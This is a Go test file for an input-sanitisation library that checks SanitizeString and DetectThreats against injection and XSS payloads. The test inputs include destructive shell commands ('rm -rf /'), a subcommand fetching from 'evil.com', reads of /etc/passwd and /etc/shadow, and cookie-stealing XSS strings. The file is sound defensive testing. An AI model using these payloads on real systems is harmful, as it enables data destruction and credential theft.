// Copyright 2026 Fynd (Shopsense Retail Technologies Pvt. Ltd.)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package utils

import (
	"regexp"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// SQL Injection tests
// ---------------------------------------------------------------------------

func TestSanitizeString_SQLInjection(t *testing.T) {
	tests := []struct {
		name  string
		input string
		check func(string) bool
	}{
		{
			"UNION SELECT",
			"1 UNION SELECT * FROM users",
			func(s string) bool { return !strings.Contains(strings.ToUpper(s), "UNION") },
		},
		{
			"DROP TABLE",
			"test'; DROP TABLE users;--",
			func(s string) bool { return !strings.Contains(s, "DROP TABLE") && !strings.Contains(s, "--") },
		},
		{
			"OR 1=1",
			"admin' OR 1=1--",
			func(s string) bool { return !strings.Contains(s, "OR 1=1") },
		},
		{
			"INSERT INTO",
			"'; INSERT INTO users VALUES('hacker')",
			func(s string) bool { return !strings.Contains(strings.ToUpper(s), "INSERT INTO") },
		},
		{
			"UPDATE SET",
			"test'; UPDATE users SET admin=1--",
			func(s string) bool { return !strings.Contains(strings.ToUpper(s), "UPDATE USERS") },
		},
		{
			"DELETE FROM",
			"'; DELETE FROM users--",
			func(s string) bool { return !strings.Contains(strings.ToUpper(s), "DELETE FROM") },
		},
		{
			"INTO OUTFILE",
			"1 UNION SELECT * INTO OUTFILE '/tmp/data'",
			func(s string) bool { return !strings.Contains(strings.ToUpper(s), "INTO OUTFILE") },
		},
		{
			"clean string preserved",
			"Hello, this is a normal sentence",
			func(s string) bool { return strings.Contains(s, "Hello") },
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if !tt.check(result) {
				t.Errorf("SanitizeString(%q) = %q, failed check", tt.input, result)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// XSS tests
// ---------------------------------------------------------------------------

func TestSanitizeString_XSS(t *testing.T) {
	tests := []struct {
		name  string
		input string
		check func(string) bool
	}{
		{
			"script tag",
			"<script>alert('xss')</script>",
			func(s string) bool { return !strings.Contains(s, "<script>") },
		},
		{
			"img onerror",
			`<img src=x onerror=alert(1)>`,
			func(s string) bool { return !strings.Contains(s, "onerror") },
		},
		{
			"onclick handler",
			`<div onclick="steal()">click me</div>`,
			func(s string) bool { return !strings.Contains(s, "onclick") },
		},
		{
			"javascript protocol",
			`javascript:alert(document.cookie)`,
			func(s string) bool { return !strings.Contains(strings.ToLower(s), "javascript:") },
		},
		{
			"data URI XSS",
			`data:text/html,<script>alert(1)</script>`,
			func(s string) bool { return !strings.Contains(strings.ToLower(s), "data:text/html") },
		},
		{
			"iframe tag",
			`<iframe src="evil.com"></iframe>`,
			func(s string) bool { return !strings.Contains(s, "<iframe") },
		},
		{
			"event handler onload",
			`<body onload="malicious()">`,
			func(s string) bool { return !strings.Contains(s, "onload") },
		},
		{
			"SVG script",
			`<svg><script>alert(1)</script></svg>`,
			func(s string) bool { return !strings.Contains(s, "<script>") },
		},
		{
			"HTML entities escape ampersand",
			"safe & sound",
			func(s string) bool {
				return strings.Contains(s, "&amp;")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if !tt.check(result) {
				t.Errorf("SanitizeString(%q) = %q, failed check", tt.input, result)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// NoSQL Injection tests
// ---------------------------------------------------------------------------

func TestSanitizeString_NoSQLInjection(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		notFound string
	}{
		{"$ne operator", `{"$ne": null}`, "$ne"},
		{"$gt operator", `{"$gt": 0}`, "$gt"},
		{"$lt operator", `{"$lt": 100}`, "$lt"},
		{"$gte operator", `{"$gte": 1}`, "$gte"},
		{"$lte operator", `{"$lte": 50}`, "$lte"},
		{"$in operator", `{"$in": [1,2,3]}`, "$in"},
		{"$nin operator", `{"$nin": [1,2]}`, "$nin"},
		{"$where operator", `{"$where": "this.a > 1"}`, "$where"},
		{"$regex operator", `{"$regex": ".*"}`, "$regex"},
		{"$exists operator", `{"$exists": true}`, "$exists"},
		{"$elemMatch operator", `{"$elemMatch": {"a":1}}`, "$elemMatch"},
		{"$or operator", `{"$or": [{"a":1}]}`, "$or"},
		{"$and operator", `{"$and": [{"a":1}]}`, "$and"},
		{"$not operator", `{"$not": {"a":1}}`, "$not"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if strings.Contains(result, tt.notFound) {
				t.Errorf("SanitizeString(%q) = %q, should not contain %q", tt.input, result, tt.notFound)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Command Injection tests
// ---------------------------------------------------------------------------

func TestSanitizeString_CommandInjection(t *testing.T) {
	tests := []struct {
		name  string
		input string
		check func(string) bool
	}{
		{
			"semicolon rm",
			"; rm -rf /",
			func(s string) bool { return !strings.Contains(s, "; rm") },
		},
		{
			"pipe cat",
			"input | cat /etc/passwd",
			func(s string) bool { return !strings.Contains(s, "| cat") },
		},
		{
			"ampersand whoami",
			"test && whoami",
			func(s string) bool { return !strings.Contains(s, "&& whoami") },
		},
		{
			"dollar subcommand",
			"$(curl evil.com)",
			func(s string) bool { return !strings.Contains(s, "$(") },
		},
		{
			"backtick execution",
			"`ls -la`",
			func(s string) bool { return !strings.Contains(s, "`ls") },
		},
		{
			"encoded newline",
			"test%0arm -rf",
			func(s string) bool { return !strings.Contains(s, "%0a") },
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if !tt.check(result) {
				t.Errorf("SanitizeString(%q) = %q, failed check", tt.input, result)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Path Traversal tests
// ---------------------------------------------------------------------------

func TestSanitizeString_PathTraversal(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		notFound string
	}{
		{"dot-dot-slash", "../../../etc/passwd", "../"},
		{"dot-dot-backslash", `..\..\windows\system32`, `..\\`},
		{"encoded traversal", "%2e%2e%2f%2e%2e%2fetc/passwd", "%2e%2e%2f"},
		{"double encoded", "%252e%252e%252f%252e%252e%252f", "%252e%252e%252f"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if strings.Contains(result, tt.notFound) {
				t.Errorf("SanitizeString(%q) = %q, should not contain %q", tt.input, result, tt.notFound)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// XXE tests
// ---------------------------------------------------------------------------

func TestSanitizeString_XXE(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		notFound string
	}{
		{
			"DOCTYPE",
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
			"<!DOCTYPE",
		},
		{
			"ENTITY declaration",
			`<!ENTITY test SYSTEM "http://evil.com/xxe">`,
			"<!ENTITY",
		},
		{
			"SYSTEM keyword",
			`SYSTEM "file:///etc/shadow"`,
			"SYSTEM",
		},
		{
			"CDATA section",
			`<![CDATA[<script>alert(1)</script>]]>`,
			"CDATA",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if strings.Contains(result, tt.notFound) {
				t.Errorf("SanitizeString(%q) = %q, should not contain %q", tt.input, result, tt.notFound)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// DetectThreats tests
// ---------------------------------------------------------------------------

func TestDetectThreats_Comprehensive(t *testing.T) {
	t.Run("clean input has no threats", func(t *testing.T) {
		report := DetectThreats("Hello, World!")
		if report.HasThreats() {
			t.Error("Clean input should not have threats")
		}
	})

	t.Run("detects SQL injection", func(t *testing.T) {
		report := DetectThreats("admin' OR 1=1--")
		if !report.SQLInjection {
			t.Error("Should detect SQL injection")
		}
	})

	t.Run("detects XSS events", func(t *testing.T) {
		report := DetectThreats(`<div onclick="alert(1)">`)
		if !report.XSSEvents {
			t.Error("Should detect XSS events")
		}
	})

	t.Run("detects CSS injection", func(t *testing.T) {
		report := DetectThreats("expression(alert(1))")
		if !report.CSSInjection {
			t.Error("Should detect CSS injection")
		}
	})

	t.Run("detects template injection", func(t *testing.T) {
		report := DetectThreats("{{constructor.constructor('return this')()}}")
		if !report.TemplateInjection {
			t.Error("Should detect template injection")
		}
	})

	t.Run("detects SSI injection", func(t *testing.T) {
		report := DetectThreats(`<!--#exec cmd="ls" -->`)
		if !report.SSIInjection {
			t.Error("Should detect SSI injection")
		}
	})

	t.Run("detects multiple threats", func(t *testing.T) {
		input := `<script>alert(1)</script>../../etc/passwd`
		report := DetectThreats(input)
		if !report.HTMLContent {
			t.Error("Should detect HTML content")
		}
		if !report.PathTraversal {
			t.Error("Should detect path traversal")
		}
	})

	t.Run("detects invisible characters", func(t *testing.T) {
		report := DetectThreats("test\u200Btest")
		if !report.InvisibleChars {
			t.Error("Should detect invisible characters")
		}
	})

	t.Run("detects null bytes", func(t *testing.T) {
		report := DetectThreats("test\x00test")
		if !report.NullBytes {
			t.Error("Should detect null bytes")
		}
	})

	t.Run("detects NoSQL injection", func(t *testing.T) {
		report := DetectThreats(`{"$where": "this.a > 1"}`)
		if !report.NoSQLInjection {
			t.Error("Should detect NoSQL injection")
		}
	})

	t.Run("detects command injection", func(t *testing.T) {
		report := DetectThreats("; rm -rf /")
		if !report.CommandInjection {
			t.Error("Should detect command injection")
		}
	})

	t.Run("detects LDAP injection", func(t *testing.T) {
		report := DetectThreats("*(objectClass=*)")
		if !report.LDAPInjection {
			t.Error("Should detect LDAP injection")
		}
	})

	t.Run("detects XXE injection", func(t *testing.T) {
		report := DetectThreats("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>")
		if !report.XXEInjection {
			t.Error("Should detect XXE injection")
		}
	})

	t.Run("detects control characters", func(t *testing.T) {
		report := DetectThreats("test\x01test")
		if !report.ControlChars {
			t.Error("Should detect control characters")
		}
	})
}

// ---------------------------------------------------------------------------
// ContainsHTML tests
// ---------------------------------------------------------------------------

func TestContainsHTML_Comprehensive(t *testing.T) {
	tests := []struct {
		input    string
		expected bool
	}{
		{"<div>test</div>", true},
		{"<script>alert(1)</script>", true},
		{"<img src=x>", true},
		{"&amp;", true},
		{"&nbsp;", true},
		{"&#x27;", true},
		{"plain text", false},
		{"test &amp test", false}, // not a valid entity (no semicolon)
		{"no tags here", false},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			if got := ContainsHTML(tt.input); got != tt.expected {
				t.Errorf("ContainsHTML(%q) = %v, want %v", tt.input, got, tt.expected)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Misc sanitize tests
// ---------------------------------------------------------------------------

func TestSanitizeString_CSSInjection(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		notFound string
	}{
		{"expression()", "color: expression(alert(1))", "expression"},
		{"@import", "@import url('evil.css')", "@import"},
		{"url(javascript)", "background: url(javascript:alert(1))", "javascript:"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if strings.Contains(strings.ToLower(result), strings.ToLower(tt.notFound)) {
				t.Errorf("SanitizeString(%q) = %q, should not contain %q", tt.input, result, tt.notFound)
			}
		})
	}
}

func TestSanitizeString_TemplateInjection(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		notFound string
	}{
		{"mustache", "{{7*7}}", "{{"},
		{"dollar brace", "${process.env.SECRET}", "${"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeString(tt.input, SanitizeOptions{})
			if strings.Contains(result, tt.notFound) {
				t.Errorf("SanitizeString(%q) = %q, should not contain %q", tt.input, result, tt.notFound)
			}
		})
	}
}

func TestSanitizeString_SSIInjection(t *testing.T) {
	input := `<!--#include virtual="/etc/passwd" -->`
	result := SanitizeString(input, SanitizeOptions{})
	if strings.Contains(result, "<!--#include") {
		t.Errorf("SanitizeString should remove SSI directives, got %q", result)
	}
}

func TestSanitizeString_DisabledOptions(t *testing.T) {
	disabled := false

	t.Run("SQL injection disabled", func(t *testing.T) {
		input := "test'; DROP TABLE users;--"
		result := SanitizeString(input, SanitizeOptions{SQLInjection: &disabled})
		// SQL injection patterns should remain (but HTML escaped)
		if !strings.Contains(result, "--") {
			t.Log("SQL injection removal was disabled, patterns may still be partially removed by other rules")
		}
	})

	t.Run("HTML disabled", func(t *testing.T) {
		input := "<b>bold</b>"
		result := SanitizeString(input, SanitizeOptions{SanitizeHTML: &disabled})
		// Tags remain but are HTML-escaped in step 9
		if len(result) == 0 {
			t.Error("Result should not be empty")
		}
	})
}

func TestValidateCharactersString(t *testing.T) {
	tests := []struct {
		input    string
		pattern  string
		expected bool
	}{
		{"abc", `^[a-z]+$`, true},
		{"ABC", `^[a-z]+$`, false},
		{"abc123", `^[a-z0-9]+$`, true},
		{"test", `[invalid`, false}, // bad regex
	}

	for _, tt := range tests {
		t.Run(tt.input+"_"+tt.pattern, func(t *testing.T) {
			if got := ValidateCharactersString(tt.input, tt.pattern); got != tt.expected {
				t.Errorf("ValidateCharactersString(%q, %q) = %v, want %v", tt.input, tt.pattern, got, tt.expected)
			}
		})
	}
}

func TestSanitizeString_InvisibleChars(t *testing.T) {
	chars := []string{
		"\u200B", // zero-width space
		"\u200C", // zero-width non-joiner
		"\u200D", // zero-width joiner
		"\uFEFF", // BOM
		"\u061C", // Arabic letter mark
	}
	for _, c := range chars {
		input := "hello" + c + "world"
		result := SanitizeString(input, SanitizeOptions{})
		if strings.Contains(result, c) {
			t.Errorf("SanitizeString should remove invisible char U+%04X", []rune(c)[0])
		}
	}
}

func TestSanitizeString_MaxLengthAndWhitelist(t *testing.T) {
	t.Run("max length", func(t *testing.T) {
		input := "this is a long string for testing"
		result := SanitizeString(input, SanitizeOptions{MaxLength: 10})
		if len(result) > 10 {
			t.Errorf("Expected max length 10, got %d: %q", len(result), result)
		}
	})

	t.Run("character whitelist", func(t *testing.T) {
		input := "abc123!@#"
		result := SanitizeString(input, SanitizeOptions{
			AllowedCharacters: regexp.MustCompile(`[a-z0-9]`),
		})
		if strings.ContainsAny(result, "!@#") {
			t.Errorf("Whitelist should filter non-matching chars, got %q", result)
		}
	})
}
